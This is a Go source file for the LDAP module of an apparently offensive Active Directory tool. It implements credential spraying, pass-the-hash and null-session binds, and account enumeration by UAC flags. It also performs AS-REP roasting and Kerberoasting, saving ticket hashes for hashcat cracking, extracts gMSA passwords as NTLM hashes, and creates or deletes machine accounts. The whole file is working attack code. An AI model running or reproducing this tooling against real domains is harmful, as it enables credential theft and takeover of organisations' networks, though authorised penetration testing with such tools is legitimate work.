package cli

import (
	"context"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os"
	"slices"
	"strconv"
	"strings"
	"time"

	altsmb "github.com/5amu/gonetexec/pkg/smb"

	"github.com/5amu/gonetexec/internal/logger"
	"github.com/5amu/gonetexec/internal/runner"
	"github.com/5amu/gonetexec/internal/utils"
	"github.com/mandiant/gopacket/pkg/kerberos"
	altldap "github.com/mandiant/gopacket/pkg/ldap"
	"github.com/mandiant/gopacket/pkg/session"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
	"golang.org/x/crypto/md4" //nolint:staticcheck
)

const ldapDefaultPort = 389

// ---------------------------------------------------------------------------
// UAC constants
// ---------------------------------------------------------------------------

type userAccountControl int

const (
	uacScript                         userAccountControl = 1
	uacAccountDisable                 userAccountControl = 2
	uacHomedirRequired                userAccountControl = 8
	uacLockout                        userAccountControl = 16
	uacPasswdNotReqd                  userAccountControl = 32
	uacPasswdCantChange               userAccountControl = 64
	uacEncryptedTextPwdAllowed        userAccountControl = 128
	uacTempDuplicateAccount           userAccountControl = 256
	uacNormalAccount                  userAccountControl = 512
	uacInterdomainTrustAccount        userAccountControl = 2048
	uacWorkstationTrustAccount        userAccountControl = 4096
	uacServerTrustAccount             userAccountControl = 8192
	uacDontExpirePassword             userAccountControl = 65536
	uacMNSLogonAccount                userAccountControl = 131072
	uacSmartcardRequired              userAccountControl = 262144
	uacTrustedForDelegation           userAccountControl = 524288
	uacNotDelegated                   userAccountControl = 1048576
	uacUseDESKeyOnly                  userAccountControl = 2097152
	uacDontRequirePreauth             userAccountControl = 4194304
	uacPasswordExpired                userAccountControl = 8388608
	uacTrustedToAuthForDelegation     userAccountControl = 16777216
	uacPartialSecretsAccount          userAccountControl = 67108864
)

// ---------------------------------------------------------------------------
// LDAP attribute names
// ---------------------------------------------------------------------------

const (
	attrSAMAccountName             = "sAMAccountName"
	attrServicePrincipalName       = "servicePrincipalName"
	attrObjectSid                  = "objectSid"
	attrObjectClass                = "objectClass"
	attrInstanceType               = "instanceType"
	attrAdminCount                 = "adminCount"
	attrUAC                        = "userAccountControl:1.2.840.113556.1.4.803:"
	attrUACRaw                     = "userAccountControl"
	attrDistinguishedName          = "distinguishedName"
	attrOperatingSystem            = "operatingSystem"
	attrOperatingSystemServicePack = "operatingSystemServicePack"
	attrOperatingSystemVersion     = "operatingSystemVersion"
	attrPasswordLastSet            = "pwdLastSet"
	attrLastLogon                  = "lastLogon"
	attrMemberOf                   = "memberOf"
	attrDescription                = "description"
	attrManagedPassword            = "msDS-ManagedPassword"
	attrUnicodePassword            = "unicodePwd"
	attrDnsHostname                = "dnsHostName"
	attrWhenCreated                = "whenCreated"
)

// ---------------------------------------------------------------------------
// Filter helpers
// ---------------------------------------------------------------------------

const (
	filterIsUser     = "(objectCategory=person)"
	filterIsGroup    = "(objectCategory=group)"
	filterIsComputer = "(objectCategory=computer)"
	filterIsAdmin    = "(adminCount=1)"
	filterGMSA       = "(objectClass=msDS-GroupManagedServiceAccount)"
)

func joinFilters(filters ...string) string {
	var b strings.Builder
	b.WriteString("(&")
	for _, f := range filters {
		b.WriteString(f)
	}
	b.WriteString(")")
	return b.String()
}

func negativeFilter(filter string) string {
	return fmt.Sprintf("(!%s)", filter)
}

func newFilter(attribute, equalsTo string) string {
	return fmt.Sprintf("(%s=%s)", attribute, equalsTo)
}

func uacFilter(prop userAccountControl) string {
	return newFilter(attrUAC, strconv.Itoa(int(prop)))
}

// ---------------------------------------------------------------------------
// Command
// ---------------------------------------------------------------------------

func NewLDAPCmd() *cobra.Command {
	var username, password, ntlm, domain string
	var port int
	var useSSL, nullSession bool

	var asrepFile, krbFile string

	var addComputer, delComputer string

	var (
		customFilter     string
		customAttributes string
		script           bool
		disabled         bool
		homedirRequired  bool
		lockout          bool
		pwdNotReqd       bool
		pwdCantChange    bool
		encTextPwd       bool
		tempDupAccount   bool
		normalAccount    bool
		interdomainTrust bool
		workstationTrust bool
		serverTrust      bool
		dontExpirePwd    bool
		mnsLogon         bool
		smartcardReq     bool
		trustedDeleg     bool
		notDelegated     bool
		useDES           bool
		dontRequirePre   bool
		pwdExpired       bool
		trustedToAuth    bool
		partialSecrets   bool
		adminCount       bool
		computers        bool
		groups           bool
		users            bool
		activeUsers      bool
		user             string
		getSID           bool
		gmsa             bool
		readNot          bool
	)

	cmd := &cobra.Command{
		Use:   "ldap [TARGETS...]",
		Short: "Own stuff using LDAP",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			targets := runner.ExtractTargets(args)
			if len(targets) == 0 {
				return
			}

			var credentials []session.Credentials
			if !nullSession {
				credentials = runner.NewCredentialsDispacher(
					username,
					password,
					ntlm,
					runner.Clusterbomb,
				)
			}

			doNothing := !slices.Contains(os.Args, "-u") && !nullSession

			// Determine action and build filters / attributes.
			action, filter, attrs := parseLDAPAction(
				os.Args,
				asrepFile, krbFile,
				addComputer, delComputer,
				customFilter, customAttributes,
				script, disabled, homedirRequired, lockout,
				pwdNotReqd, pwdCantChange, encTextPwd, tempDupAccount,
				normalAccount, interdomainTrust, workstationTrust, serverTrust,
				dontExpirePwd, mnsLogon, smartcardReq, trustedDeleg,
				notDelegated, useDES, dontRequirePre, pwdExpired,
				trustedToAuth, partialSecrets,
				adminCount, computers, groups, users, activeUsers,
				user, getSID, gmsa, readNot,
			)

			var runners []runner.Runner
			for _, target := range targets {
				target.Port = port
				if nullSession || len(credentials) == 0 {
					runners = append(runners, &LDAPRunner{
						target:      target,
						port:        port,
						useSSL:      useSSL,
						domain:      domain,
						action:      action,
						filter:      filter,
						attributes:  attrs,
						createName:  addComputer,
						createUAC:   int(uacWorkstationTrustAccount),
						deleteName:  delComputer,
						deleteType:  delComputerType,
						hashFile:    asrepFile,
						krbFile:     krbFile,
						doNothing:   doNothing,
						nullSession: nullSession,
					})
				} else {
					for _, creds := range credentials {
						creds.Domain = domain
						runners = append(runners, &LDAPRunner{
							target:      target,
							port:        port,
							credentials: creds,
							useSSL:      useSSL,
							domain:      domain,
							action:      action,
							filter:      filter,
							attributes:  attrs,
							createName:  addComputer,
							createUAC:   int(uacWorkstationTrustAccount),
							deleteName:  delComputer,
							deleteType:  delComputerType,
							hashFile:    asrepFile,
							krbFile:     krbFile,
							doNothing:   doNothing,
							nullSession: nullSession,
						})
					}
				}
			}

			if err := runner.ParallelRun(context.Background(), runners, nil); err != nil {
				l := logger.New("LDAP", targets[0].Host, targets[0].Host, port)
				l.Error(fmt.Sprintln(err))
			}
		},
	}

	connFlags := pflag.NewFlagSet("Connection Flags", pflag.ContinueOnError)
	connFlags.StringVarP(&username, "username", "u", "", "Provide username (or FILE)")
	connFlags.StringVarP(&password, "password", "p", "", "Provide password (or FILE)")
	connFlags.BoolVar(&nullSession, "null-session", false, "Authenticate with null credentials")
	connFlags.StringVarP(&ntlm, "hashes", "H", "", "Authenticate with NTLM hash")
	connFlags.StringVarP(&domain, "domain", "d", "", "Provide domain")
	connFlags.IntVar(&port, "port", ldapDefaultPort, "LDAP port to contact")
	connFlags.BoolVarP(&useSSL, "ssl", "s", false, "Use SSL to interact with LDAP")

	hashFlags := pflag.NewFlagSet("Hash Retrieval Flags", pflag.ContinueOnError)
	hashFlags.StringVar(&asrepFile, "asreproast", "", "Grab AS_REP ticket(s) parsed to be cracked with hashcat")
	hashFlags.StringVar(&krbFile, "kerberoast", "", "Grab TGS ticket(s) parsed to be cracked with hashcat")

	createFlags := pflag.NewFlagSet("Create Flags", pflag.ContinueOnError)
	createFlags.StringVar(&addComputer, "add-computer", "", "Create a computer object")

	readFlags := pflag.NewFlagSet("Read Flags", pflag.ContinueOnError)
	readFlags.StringVarP(&customFilter, "filter", "f", "", "Bring your own filter")
	readFlags.StringVarP(&customAttributes, "attributes", "a", "", "Ask your attributes (comma separated)")
	readFlags.BoolVar(&script, "script", false, "Filter for objects with flag SCRIPT")
	readFlags.BoolVar(&disabled, "disabled", false, "Filter for objects with flag ACCOUNTDISABLE")
	readFlags.BoolVar(&homedirRequired, "homedir-required", false, "Filter for objects with flag HOMEDIR_REQUIRED")
	readFlags.BoolVar(&lockout, "lockout", false, "Filter for objects with flag LOCKOUT")
	readFlags.BoolVar(&pwdNotReqd, "password-not-required", false, "Filter for objects with flag PASSWD_NOTREQD")
	readFlags.BoolVar(&pwdCantChange, "password-cant-change", false, "Filter for objects with flag PASSWD_CANT_CHANGE")
	readFlags.BoolVar(&encTextPwd, "encrypted-text-pwd-allowed", false, "Filter for objects with flag ENCRYPTED_TEXT_PWD_ALLOWED")
	readFlags.BoolVar(&tempDupAccount, "temp-duplicate-account", false, "Filter for objects with flag TEMP_DUPLICATE_ACCOUNT")
	readFlags.BoolVar(&normalAccount, "normal-account", false, "Filter for objects with flag NORMAL_ACCOUNT")
	readFlags.BoolVar(&interdomainTrust, "interdomain-trust-account", false, "Filter for objects with flag INTERDOMAIN_TRUST_ACCOUNT")
	readFlags.BoolVar(&workstationTrust, "workstation-trust-account", false, "Filter for objects with flag WORKSTATION_TRUST_ACCOUNT")
	readFlags.BoolVar(&serverTrust, "server-trust-account", false, "Filter for objects with flag SERVER_TRUST_ACCOUNT")
	readFlags.BoolVar(&dontExpirePwd, "password-never-expires", false, "Filter for objects with flag DONT_EXPIRE_PASSWD")
	readFlags.BoolVar(&mnsLogon, "mns-logon-account", false, "Filter for objects with flag MNS_LOGON_ACCOUNT")
	readFlags.BoolVar(&smartcardReq, "smartcard-required", false, "Filter for objects with flag SMARTCARD_REQUIRED")
	readFlags.BoolVar(&trustedDeleg, "trusted-for-delegation", false, "Filter for objects with flag TRUSTED_FOR_DELEGATION")
	readFlags.BoolVar(&notDelegated, "not-delegated", false, "Filter for objects with flag NOT_DELEGATED")
	readFlags.BoolVar(&useDES, "use-des-key-only", false, "Filter for objects with flag USE_DES_KEY_ONLY")
	readFlags.BoolVar(&dontRequirePre, "dont-require-preauth", false, "Filter for objects with flag DONT_REQ_PREAUTH")
	readFlags.BoolVar(&pwdExpired, "password-expired", false, "Filter for objects with flag PASSWORD_EXPIRED")
	readFlags.BoolVar(&trustedToAuth, "trusted-to-auth-for-delegation", false, "Filter for objects with flag TRUSTED_TO_AUTH_FOR_DELEGATION")
	readFlags.BoolVar(&partialSecrets, "partial-secrets-account", false, "Filter for objects with flag PARTIAL_SECRETS_ACCOUNT")
	readFlags.BoolVar(&adminCount, "admin-count", false, "Enumerate objects that have an adminCount")
	readFlags.BoolVar(&computers, "computers", false, "Enumerate objects that are computers")
	readFlags.BoolVar(&groups, "groups", false, "Enumerate objects that are domain groups")
	readFlags.BoolVar(&users, "users", false, "Enumerate objects that are enabled domain users")
	readFlags.BoolVar(&activeUsers, "active-users", false, "Enumerate objects that are active enabled domain users")
	readFlags.StringVar(&user, "user", "", "Get data about a single user")
	readFlags.BoolVar(&getSID, "sid", false, "Get domain SID")
	readFlags.BoolVar(&gmsa, "gmsa", false, "Get GMSA passwords")
	readFlags.BoolVar(&readNot, "not", false, "Negate next filter")

	deleteFlags := pflag.NewFlagSet("Delete Flags", pflag.ContinueOnError)
	deleteFlags.StringVar(&delComputer, "del-computer", "", "Delete a computer object")

	return generateCli(cmd, connFlags, hashFlags, createFlags, readFlags, deleteFlags)
}

// ---------------------------------------------------------------------------
// Action type
// ---------------------------------------------------------------------------

type ldapAction int

const (
	ldapAuth ldapAction = iota
	ldapRead
	ldapCreate
	ldapDelete
	ldapAsrepRoast
	ldapKerberoast
)

type deletionType int

const (
	delComputerType deletionType = iota
	delUserType
)

// ---------------------------------------------------------------------------
// Action parsing
// ---------------------------------------------------------------------------

func parseLDAPAction(
	args []string,
	asrepFile, krbFile string,
	addComputer, delComputer string,
	customFilter, customAttributes string,
	script, disabled, homedirRequired, lockout bool,
	pwdNotReqd, pwdCantChange, encTextPwd, tempDupAccount bool,
	normalAccount, interdomainTrust, workstationTrust, serverTrust bool,
	dontExpirePwd, mnsLogon, smartcardReq, trustedDeleg bool,
	notDelegated, useDES, dontRequirePre, pwdExpired bool,
	trustedToAuth, partialSecrets bool,
	adminCount, computers, groups, users, activeUsers bool,
	user string,
	getSID, gmsa, readNot bool,
) (ldapAction, string, []string) {
	if asrepFile != "" {
		return ldapAsrepRoast,
			joinFilters(filterIsUser, uacFilter(uacDontRequirePreauth)),
			[]string{attrSAMAccountName}
	}
	if krbFile != "" {
		return ldapKerberoast,
			joinFilters(filterIsUser, negativeFilter(uacFilter(uacAccountDisable))),
			[]string{attrSAMAccountName, attrServicePrincipalName}
	}
	if addComputer != "" {
		return ldapCreate, "", nil
	}
	if delComputer != "" {
		return ldapDelete, "", nil
	}

	if getSID {
		return ldapRead,
			uacFilter(uacServerTrustAccount),
			[]string{attrObjectSid}
	}
	if gmsa {
		return ldapRead,
			filterGMSA,
			[]string{attrSAMAccountName, attrManagedPassword}
	}

	attributes := parseAttributes(customAttributes)

	var filters []string
	var nextNegated bool

	for _, a := range args {
		attr := strings.TrimPrefix(strings.TrimPrefix(a, "--"), "-")
		if attr == "" {
			continue
		}

		var f []string
		switch attr {
		case "filter", "f":
			f = []string{customFilter}
		case "script":
			f = []string{uacFilter(uacScript)}
		case "disabled":
			f = []string{uacFilter(uacAccountDisable)}
		case "homedir-required":
			f = []string{uacFilter(uacHomedirRequired)}
		case "lockout":
			f = []string{uacFilter(uacLockout)}
		case "password-not-required":
			f = []string{uacFilter(uacPasswdNotReqd)}
		case "password-cant-change":
			f = []string{uacFilter(uacPasswdCantChange)}
		case "encrypted-text-pwd-allowed":
			f = []string{uacFilter(uacEncryptedTextPwdAllowed)}
		case "temp-duplicate-account":
			f = []string{uacFilter(uacTempDuplicateAccount)}
		case "normal-account":
			f = []string{uacFilter(uacNormalAccount)}
		case "interdomain-trust-account":
			f = []string{uacFilter(uacInterdomainTrustAccount)}
		case "workstation-trust-account":
			f = []string{uacFilter(uacWorkstationTrustAccount)}
		case "server-trust-account":
			f = []string{uacFilter(uacServerTrustAccount)}
		case "password-never-expires":
			f = []string{uacFilter(uacDontExpirePassword)}
		case "mns-logon-account":
			f = []string{uacFilter(uacMNSLogonAccount)}
		case "smartcard-required":
			f = []string{uacFilter(uacSmartcardRequired)}
		case "trusted-for-delegation":
			f = []string{uacFilter(uacTrustedForDelegation)}
		case "not-delegated":
			f = []string{uacFilter(uacNotDelegated)}
		case "use-des-key-only":
			f = []string{uacFilter(uacUseDESKeyOnly)}
		case "dont-require-preauth":
			f = []string{uacFilter(uacDontRequirePreauth)}
		case "password-expired":
			f = []string{uacFilter(uacPasswordExpired)}
		case "trusted-to-auth-for-delegation":
			f = []string{uacFilter(uacTrustedToAuthForDelegation)}
		case "partial-secrets-account":
			f = []string{uacFilter(uacPartialSecretsAccount)}
		case "admin-count":
			f = []string{filterIsAdmin}
		case "computers":
			f = []string{filterIsComputer}
		case "groups":
			f = []string{filterIsGroup}
		case "users":
			f = []string{filterIsUser}
		case "active-users":
			f = []string{filterIsUser, negativeFilter(uacFilter(uacAccountDisable))}
		case "user":
			f = []string{filterIsUser, newFilter(attrSAMAccountName, user)}
		case "sid":
			f = []string{uacFilter(uacServerTrustAccount)}
		case "gmsa":
			f = []string{filterGMSA}
		case "not":
			nextNegated = true
			continue
		default:
			continue
		}

		if nextNegated {
			if len(f) == 1 {
				f = []string{negativeFilter(f[0])}
			} else {
				f = []string{negativeFilter(joinFilters(f...))}
			}
			nextNegated = false
		}
		filters = append(filters, f...)
	}

	if len(filters) == 0 {
		return ldapAuth, "", nil
	}

	slices.Sort(filters)
	filters = slices.Compact(filters)

	var filter string
	if len(filters) == 1 {
		filter = filters[0]
	} else {
		filter = joinFilters(filters...)
	}

	return ldapRead, filter, attributes
}

func parseAttributes(s string) []string {
	if s == "" {
		return []string{attrSAMAccountName, attrDescription}
	}
	var out []string
	for _, a := range strings.Split(s, ",") {
		switch strings.ToLower(a) {
		case strings.ToLower(attrSAMAccountName), "name":
			out = append(out, attrSAMAccountName)
		case strings.ToLower(attrServicePrincipalName), "spn":
			out = append(out, attrServicePrincipalName)
		case strings.ToLower(attrObjectSid):
			out = append(out, attrObjectSid)
		case strings.ToLower(attrAdminCount):
			out = append(out, attrAdminCount)
		case strings.ToLower(attrDistinguishedName), "dn":
			out = append(out, attrDistinguishedName)
		case strings.ToLower(attrOperatingSystem):
			out = append(out, attrOperatingSystem)
		case strings.ToLower(attrOperatingSystemServicePack):
			out = append(out, attrOperatingSystemServicePack)
		case strings.ToLower(attrOperatingSystemVersion):
			out = append(out, attrOperatingSystemVersion)
		case strings.ToLower(attrPasswordLastSet):
			out = append(out, attrPasswordLastSet)
		case strings.ToLower(attrLastLogon):
			out = append(out, attrLastLogon)
		case strings.ToLower(attrMemberOf):
			out = append(out, attrMemberOf)
		case strings.ToLower(attrDescription):
			out = append(out, attrDescription)
		case strings.ToLower(attrManagedPassword):
			out = append(out, attrManagedPassword)
		case strings.ToLower(attrWhenCreated):
			out = append(out, attrWhenCreated)
		default:
			out = append(out, a)
		}
	}
	return out
}

// ---------------------------------------------------------------------------
// Runner
// ---------------------------------------------------------------------------

type LDAPRunner struct {
	target      session.Target
	port        int
	credentials session.Credentials
	useSSL      bool
	domain      string
	action      ldapAction
	filter      string
	attributes  []string
	createName  string
	createUAC   int
	deleteName  string
	deleteType  deletionType
	hashFile    string
	krbFile     string
	doNothing   bool
	nullSession bool
	cancelCtx   context.CancelFunc
}

func (r *LDAPRunner) Start(ctx context.Context) error {
	childCtx, cancel := context.WithCancel(ctx)
	r.cancelCtx = cancel
	defer r.Stop()

	info, err := altsmb.Fingerprint(r.target.Host, 445)
	if err != nil {
		l := logger.New("LDAP", r.target.Host, r.target.Host, r.port)
		l.Error(fmt.Sprintln(err))
		return err
	}
	l := logger.New("LDAP", r.target.Host, info.NetBIOSComputerName, r.port)
	l.Info(formatLDAPFingerprint(info))

	if r.doNothing {
		return nil
	}

	domain := r.domain
	if domain == "" {
		domain = info.DNSDomainName
	}

	switch r.action {
	case ldapRead:
		return r.read(childCtx, domain)
	case ldapCreate:
		return r.create(childCtx, domain)
	case ldapDelete:
		return r.delete(childCtx, domain)
	case ldapAsrepRoast:
		return r.asreproast(childCtx, domain)
	case ldapKerberoast:
		return r.kerberoast(childCtx, domain)
	default:
		return r.authenticate(childCtx, domain)
	}
}

func (r *LDAPRunner) Stop() {
	if r.cancelCtx != nil {
		r.cancelCtx()
	}
}

func formatLDAPFingerprint(f *altsmb.SMBFingerprint) string {
	var b strings.Builder
	b.WriteString(f.DNSComputerName)
	if f.OSVersion != "" {
		b.WriteString(" " + fmt.Sprintf("(version:%s)", f.OSVersion))
	}
	b.WriteString(" " + fmt.Sprintf("(name:%s)", f.NetBIOSComputerName))
	b.WriteString(" " + fmt.Sprintf("(domain:%s)", f.DNSDomainName))
	return b.String()
}

// ---------------------------------------------------------------------------
// Connect & authenticate
// ---------------------------------------------------------------------------

func (r *LDAPRunner) connect() (*altldap.Client, error) {
	target := r.target
	if target.Port == 0 {
		target.Port = r.port
	}
	client := altldap.NewClient(target, &r.credentials)
	if err := client.Connect(r.useSSL); err != nil {
		return nil, err
	}
	return client, nil
}

func (r *LDAPRunner) login(client *altldap.Client, domain string) error {
	if r.nullSession {
		return client.Conn.UnauthenticatedBind("")
	}
	if r.credentials.Hash != "" {
		hash := r.credentials.Hash
		if strings.Contains(hash, ":") {
			parts := strings.Split(hash, ":")
			if len(parts) == 2 {
				hash = parts[1]
			}
		}
		d := domain
		if d == "" {
			d = "WORKGROUP"
		}
		return client.Conn.NTLMBindWithHash(d, r.credentials.Username, hash)
	}
	bindUser := r.credentials.Username
	if domain != "" {
		bindUser = fmt.Sprintf("%s\\%s", domain, r.credentials.Username)
	}
	if err := client.Conn.NTLMBind(domain, r.credentials.Username, r.credentials.Password); err == nil {
		return nil
	}
	if err := client.Conn.Bind(bindUser, r.credentials.Password); err == nil {
		return nil
	}
	if r.credentials.Password == "" {
		return client.Conn.UnauthenticatedBind(r.credentials.Username)
	}
	return fmt.Errorf("authentication failed")
}

func (r *LDAPRunner) authenticate(ctx context.Context, domain string) error {
	l := logger.New("LDAP", r.target.Host, r.target.Host, r.port)

	client, err := r.connect()
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	defer client.Close()

	if err := r.login(client, domain); err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}

	credStr := credentialString(r.credentials, domain)
	l.Log(ctx, logger.LevelSuccess.Level(), credStr)
	return nil
}

// ---------------------------------------------------------------------------
// Read
// ---------------------------------------------------------------------------

func (r *LDAPRunner) read(ctx context.Context, domain string) error {
	l := logger.New("LDAP", r.target.Host, r.target.Host, r.port)

	client, err := r.connect()
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	defer client.Close()

	if err := r.login(client, domain); err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}

	if r.filter == "" {
		return nil
	}

	l.Info("LDAP Query Filter: " + r.filter)

	baseDN := toDN(domain)
	res, err := client.SearchWithPaging(baseDN, r.filter, r.attributes, 1000)
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}

	for _, entry := range res.Entries {
		var data []string
		for _, a := range r.attributes {
			switch a {
			case attrLastLogon, attrPasswordLastSet, attrWhenCreated:
				data = append(data, decodeADTimestamp(unpackString(entry.GetAttributeValues(a))))
			case attrObjectSid:
				data = append(data, decodeSID(unpackString(entry.GetAttributeValues(a))))
			case attrManagedPassword:
				raw := entry.GetRawAttributeValue(a)
				pwd, _ := decodeMSDSManagedPasswordBlob(raw)
				data = append(data, hashDataNTLM(pwd))
			default:
				data = append(data, unpackString(entry.GetAttributeValues(a)))
			}
		}
		l.Info(strings.Join(data, " "))
	}
	return nil
}

// ---------------------------------------------------------------------------
// Create
// ---------------------------------------------------------------------------

func (r *LDAPRunner) create(ctx context.Context, domain string) error {
	l := logger.New("LDAP", r.target.Host, r.target.Host, r.port)

	client, err := r.connect()
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	defer client.Close()

	if err := r.login(client, domain); err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}

	name := strings.TrimSuffix(r.createName, "$")
	dn := fmt.Sprintf("CN=%s,CN=Computers,%s", name, toDN(domain))
	attrs := map[string][]string{
		attrObjectClass:    {"top", "organizationalPerson", "user", "computer"},
		attrUACRaw:         {fmt.Sprint(r.createUAC)},
		attrInstanceType:   {fmt.Sprintf("%d", 4)}, // IT_Writable
		attrSAMAccountName: {name + "$"},
		attrDnsHostname:    {fmt.Sprintf("%s.%s", name, domain)},
		attrServicePrincipalName: {
			fmt.Sprintf("HOST/%s", name),
			fmt.Sprintf("HOST/%s.%s", name, domain),
			fmt.Sprintf("RestrictedKrbHost/%s", name),
			fmt.Sprintf("RestrictedKrbHost/%s.%s", name, domain),
		},
	}

	password := utils.GeneratePassword(12)
	attrs[attrUnicodePassword] = []string{utils.StringToUTF16(password)}

	if err := client.Add(dn, attrs); err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	l.Log(ctx, logger.LevelSuccess.Level(), fmt.Sprintf("%s %s", name, password))
	return nil
}

// ---------------------------------------------------------------------------
// Delete
// ---------------------------------------------------------------------------

func (r *LDAPRunner) delete(ctx context.Context, domain string) error {
	l := logger.New("LDAP", r.target.Host, r.target.Host, r.port)

	client, err := r.connect()
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	defer client.Close()

	if err := r.login(client, domain); err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}

	name := strings.TrimSuffix(r.deleteName, "$")
	dn := fmt.Sprintf("CN=%s,CN=Computers,%s", name, toDN(domain))

	if err := client.Delete(dn); err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	l.Log(ctx, logger.LevelSuccess.Level(), fmt.Sprintf("%s successfully deleted", r.deleteName))
	return nil
}

// ---------------------------------------------------------------------------
// Hashes
// ---------------------------------------------------------------------------

func (r *LDAPRunner) asreproast(ctx context.Context, domain string) error {
	l := logger.New("LDAP", r.target.Host, r.target.Host, r.port)

	client, err := r.connect()
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	defer client.Close()

	if err := r.login(client, domain); err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}

	baseDN := toDN(domain)
	res, err := client.SearchWithPaging(baseDN, r.filter, r.attributes, 1000)
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}

	var hashes []string
	for _, entry := range res.Entries {
		name := entry.GetAttributeValue(attrSAMAccountName)
		if name == "" {
			continue
		}
		hash, err := kerberos.GetASREP(name, domain, r.target.Host, "hashcat")
		if err != nil {
			l.Error(fmt.Sprintln(err))
			continue
		}
		l.Info(fmt.Sprintf("%s %s", name, hash))
		hashes = append(hashes, hash)
	}

	if len(hashes) == 0 {
		return nil
	}
	if err := utils.WriteLines(hashes, r.hashFile); err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	l.Info("Saving hashes to " + r.hashFile)
	return nil
}

func (r *LDAPRunner) kerberoast(ctx context.Context, domain string) error {
	l := logger.New("LDAP", r.target.Host, r.target.Host, r.port)

	client, err := r.connect()
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	defer client.Close()

	if err := r.login(client, domain); err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}

	baseDN := toDN(domain)
	res, err := client.SearchWithPaging(baseDN, r.filter, r.attributes, 1000)
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}

	var hashes []string
	for _, entry := range res.Entries {
		spns := entry.GetAttributeValues(attrServicePrincipalName)
		name := entry.GetAttributeValue(attrSAMAccountName)
		if name == "" || len(spns) == 0 {
			continue
		}
		for i, spn := range spns {
			res, err := kerberos.GetTGS(r.credentials.Username, r.credentials.Password, domain, r.target.Host, name, spn)
			if err != nil {
				l.Error(fmt.Sprintln(err))
				continue
			}
			l.Info(fmt.Sprintf("%s %s", name, res.Hash))
			if i == 0 {
				hashes = append(hashes, res.Hash)
			}
		}
	}

	if len(hashes) == 0 {
		return nil
	}
	if err := utils.WriteLines(hashes, r.krbFile); err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	l.Info("Saving hashes to " + r.krbFile)
	return nil
}

// ---------------------------------------------------------------------------
// Utilities
// ---------------------------------------------------------------------------

func toDN(s string) string {
	return fmt.Sprintf("dc=%s", strings.Join(strings.Split(s, "."), ",dc="))
}

func decodeSID(s string) string {
	b := []byte(s)
	if len(b) < 8 {
		return s
	}
	revisionLvl := int(b[0])
	subAuthorityCount := int(b[1]) & 0xFF

	var authority int
	for i := 2; i <= 7; i++ {
		authority = authority | int(b[i])<<(8*(5-(i-2)))
	}

	const size = 4
	offset := 8
	var subAuthorities []int
	for i := 0; i < subAuthorityCount; i++ {
		var subAuthority int
		for k := 0; k < size; k++ {
			subAuthority = subAuthority | (int(b[offset+k])&0xFF)<<(8*k)
		}
		subAuthorities = append(subAuthorities, subAuthority)
		offset += size
	}

	var builder strings.Builder
	builder.WriteString("S-")
	builder.WriteString(fmt.Sprintf("%d-", revisionLvl))
	builder.WriteString(fmt.Sprintf("%d", authority))
	for _, v := range subAuthorities {
		builder.WriteString(fmt.Sprintf("-%d", v))
	}
	return builder.String()
}

func decodeADTimestamp(timestamp string) string {
	adtime, _ := strconv.ParseInt(timestamp, 10, 64)
	if adtime == 9223372036854775807 || adtime == 0 {
		return "Not Set"
	}
	unixtime := adtime/(10*1000*1000) - 11644473600
	return time.Unix(unixtime, 0).Format("2006-01-02 3:4:5 pm")
}

func unpackString(i interface{}) string {
	unpacked, ok := i.([]string)
	if !ok {
		unpacked, ok := i.(string)
		if ok {
			return unpacked
		}
		return ""
	}
	switch len(unpacked) {
	case 0:
		return ""
	case 1:
		return unpacked[0]
	default:
		return strings.Join(unpacked, " ")
	}
}

func hashDataNTLM(b []byte) string {
	mdfour := md4.New()
	_, _ = mdfour.Write(b)
	return hex.EncodeToString(mdfour.Sum(nil))
}

func credentialString(creds session.Credentials, domain string) string {
	if creds.Hash != "" {
		return fmt.Sprintf("%s\\%s:%s", domain, creds.Username, creds.Hash)
	}
	return fmt.Sprintf("%s\\%s:%s", domain, creds.Username, creds.Password)
}

func decodeMSDSManagedPasswordBlob(data []byte) ([]byte, error) {
	if len(data) < 16 {
		return nil, fmt.Errorf("blob too short")
	}
	version := binary.LittleEndian.Uint16(data[0:2])
	_ = version
	_ = binary.LittleEndian.Uint16(data[2:4]) // reserved
	_ = binary.LittleEndian.Uint32(data[4:8]) // length
	currentPasswordOffset := binary.LittleEndian.Uint16(data[8:10])

	if int(currentPasswordOffset) >= len(data) {
		return nil, fmt.Errorf("invalid offset")
	}

	pwd := data[currentPasswordOffset:]
	// UTF-16 null terminated
	for i := 0; i < len(pwd)-1; i += 2 {
		if pwd[i] == 0 && pwd[i+1] == 0 {
			return pwd[:i], nil
		}
	}
	return pwd, nil
}
